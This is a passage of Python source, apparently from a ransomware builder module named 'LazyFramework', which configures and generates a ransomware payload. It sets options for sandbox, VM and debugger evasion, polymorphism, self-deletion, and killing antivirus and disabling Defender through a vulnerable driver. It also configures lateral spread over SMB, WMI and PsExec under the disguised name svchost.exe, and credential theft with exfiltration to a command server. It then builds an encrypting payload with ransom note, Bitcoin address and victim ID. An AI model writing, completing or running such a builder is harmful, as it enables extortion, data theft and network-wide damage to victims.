    a_tim = str(options.get("ANTI_TIMING", True)).lower() == "true"
    a_su = str(options.get("ANTI_SANDBOX_USER", True)).lower() == "true"
    a_sd = str(options.get("ANTI_SANDBOX_DISK", True)).lower() == "true"
    a_sr = str(options.get("ANTI_SANDBOX_RAM", True)).lower() == "true"
    a_sc = str(options.get("ANTI_SANDBOX_CPU", True)).lower() == "true"
    a_sut = str(options.get("ANTI_SANDBOX_UPTIME", True)).lower() == "true"
    a_net = str(options.get("ANTI_NETWORK", True)).lower() == "true"
    a_sd2 = str(options.get("SELF_DELETE", True)).lower() == "true"
    a_poly = str(options.get("POLYMORPHIC", True)).lower() == "true"
    a_eh = str(options.get("ENCRYPT_HEADER", True)).lower() == "true"
    a_tp = str(options.get("TRIPLE_PASS", True)).lower() == "true"

    byv = str(options.get("BYOVD_ENABLED", True)).lower() == "true"
    byd = options.get("BYOVD_DRIVER", "gdrv")
    byk = str(options.get("BYOVD_AUTO_KILL_AV", True)).lower() == "true"
    bye = str(options.get("BYOVD_DISABLE_ETW", True)).lower() == "true"
    bydef = str(options.get("BYOVD_DISABLE_DEFENDER", True)).lower() == "true"

    ss = str(options.get("SMB_SPREAD", True)).lower() == "true"
    sm = options.get("SMB_METHODS", "smb,wmi,psexec,admin_share,remote_schtasks,scmr")
    smh = int(options.get("SMB_MAX_HOSTS", 50))
    ssub = options.get("SMB_SCAN_SUBNETS", "auto")
    st = int(options.get("SMB_TIMEOUT", 5))
    scr = options.get("SMB_CREDENTIALS", "")
    spn = options.get("SMB_PAYLOAD_NAME", "svchost.exe")
    sper = str(options.get("SMB_PERSIST", True)).lower() == "true"
    sse = str(options.get("SMB_SELF_EXEC", True)).lower() == "true"

    post_exp = str(options.get("POST_EXPLOIT_ENABLED", True)).lower() == "true"
    post_actions = options.get("POST_EXPLOIT_ACTIONS", "creds,discovery,exfil")
    post_max_mb = int(options.get("POST_EXPLOIT_MAX_EXFIL_MB", 2000))
    post_method = options.get("POST_EXPLOIT_EXFIL_METHOD", "c2")
    post_cats = options.get("POST_EXPLOIT_EXFIL_CATEGORIES", "all")

    use_hybrid = encryption == "hybrid"

    print("=" * 70)
    print("  LAZYFRAMEWORK RANSOMWARE CLIENT (Hybrid + Post-Exploit)")
    print("=" * 70)
    print("  LHOST: " + lhost + ":" + str(lport))
    print("  ENCRYPTION: " + encryption)
    print("  RSA SIZE: " + (str(rsa_size) if use_hybrid else "N/A"))
    print("  TARGET: " + tos)
    print("  POST-EXPLOIT: " + ("ENABLED" if post_exp else "DISABLED"))
    print("=" * 70)

    builder = RansomwareBuilder()

    rsa_priv = ""
    rsa_pub = ""
    if use_hybrid:
        try:
            rsa_priv, rsa_pub = builder.generate_rsa_keypair(rsa_size)
            if "-----BEGIN" not in rsa_pub:
                use_hybrid = False
                encryption = "xor"
            else:
                saved_path = builder.save_private_key(
                    rsa_priv, name="ransomware_private"
                )
                print("[+] Private key saved: " + saved_path)
        except Exception as e:
            print("[!] RSA failed: " + str(e))
            use_hybrid = False
            encryption = "xor"

    result = builder.generate_payload(
        lhost,
        lport,
        encryption,
        extensions,
        ransom_note,
        btc,
        wallpaper,
        countdown,
        True,
        10,
        use_gui,
        dkey,
        av,
        pe,
        rsa_public_key_pem=rsa_pub,
        rsa_private_key_pem=rsa_priv,
        use_hybrid=use_hybrid,
        parallel=par,
        thread_count=tc,
        target_os=tos,
        lateral_movement=True,
        lolbins=True,
        spread_methods="all",
        target_subnets="192.168.1.0/24,10.0.0.0/24",
        max_spread_hosts=10,
        use_credentials=True,
        anti_vm=a_vm,
        anti_debug=a_dbg,
        anti_forensic=a_fr,
        anti_dump=a_dmp,
        anti_recovery=a_rec,
        anti_timing=a_tim,
        anti_sandbox_user=a_su,
        anti_sandbox_disk=a_sd,
        anti_sandbox_ram=a_sr,
        anti_sandbox_cpu=a_sc,
        anti_sandbox_uptime=a_sut,
        anti_network=a_net,
        self_delete=a_sd2,
        polymorphic=a_poly,
        encrypt_header=a_eh,
        triple_pass=a_tp,
        byovd_enabled=byv,
        byovd_driver=byd,
        byovd_auto_kill_av=byk,
        byovd_disable_etw=bye,
        byovd_disable_defender=bydef,
        smb_spread=ss,
        smb_methods=sm,
        smb_max_hosts=smh,
        smb_scan_subnets=ssub,
        smb_timeout=st,
        smb_credentials=scr,
        smb_payload_name=spn,
        smb_persist=sper,
        smb_self_exec=sse,
        change_desktop_icons_flag=change_icons,
        ransom_icon_url=icon_url,
        post_exploit_enabled=post_exp,
        post_exploit_actions=post_actions,
        post_exploit_max_exfil_mb=post_max_mb,
        post_exploit_exfil_method=post_method,
        post_exploit_exfil_categories=post_cats,
    )

    print()
    print("[+] GENERATED: " + result["encryption_mode"].upper())
    print("    Target OS: " + result.get("target_os", tos))
    if use_hybrid:
        print("    Victim ID: " + result["victim_id"])
        print("    Fingerprint: " + result["key_fingerprint"])
    print("=" * 60)

    return result["python"]
